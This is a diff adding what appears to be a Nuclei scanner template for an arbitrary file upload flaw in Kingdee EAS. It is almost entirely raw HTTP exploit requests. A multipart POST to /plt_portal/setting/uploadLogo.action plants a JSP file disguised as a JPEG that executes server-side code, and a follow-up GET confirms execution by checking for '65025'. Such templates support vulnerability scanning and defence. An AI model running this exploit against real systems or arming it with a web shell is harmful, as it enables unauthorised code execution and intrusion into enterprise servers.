@@ -1,0 +1,69 @@
+id: kingdee-eas-uploadlogo-action-fileupload
+
+info:
+  name: 金蝶EAS uploadLogo.action任意文件上传
+  author: pphua,nobody
+  severity: critical
+  tags: kingdee,fileupload,eas
+
+
+http:
+  - raw:
+      - |
+        POST /plt_portal/setting/uploadLogo.action HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycxkT8bV6WLIUzm2p
+        
+        
+        ------WebKitFormBoundarycxkT8bV6WLIUzm2p
+        Content-Disposition: form-data; name="chooseLanguage_top"
+        
+        ch
+        ------WebKitFormBoundarycxkT8bV6WLIUzm2p
+        Content-Disposition: form-data; name="dataCenter"
+        
+        xx
+        ------WebKitFormBoundarycxkT8bV6WLIUzm2p
+        Content-Disposition: form-data; name="insId"  fragment-1641287796427
+        
+        ------WebKitFormBoundarycxkT8bV6WLIUzm2p
+        Content-Disposition: form-data; name="type"
+        
+        top
+        ------WebKitFormBoundarycxkT8bV6WLIUzm2p
+        Content-Disposition: form-data; name="upload"; filename="cnvd.jsp"
+        Content-Type: image/jpeg
+        
+        <%{
+                    out.println(System.getProperty("user.name"));
+          out.println(255*255);
+                }%>
+        ------WebKitFormBoundarycxkT8bV6WLIUzm2p--
+
+      - |
+        GET /portal/res/file/upload/{{shell}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (iPod; U; CPU iPhone OS 3_0 like Mac OS X; ko-KR) AppleWebKit/535.16.4 (KHTML, like Gecko) Version/3.0.5 Mobile/8B117 Safari/6535.16.4
+        Connection: close
+
+
+    extractors:
+      - type: regex
+        name: shell
+        internal: true
+        regex:
+          - "2[0-9]{1,100}.jsp"
+      - type: dsl
+        dsl:
+          - "body_2"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200"
+          - "contains(body_2,'xxxscan') || contains(body_2,'65025')"
+        condition: and
+
+# Enhanced by mp on 2022/07/22
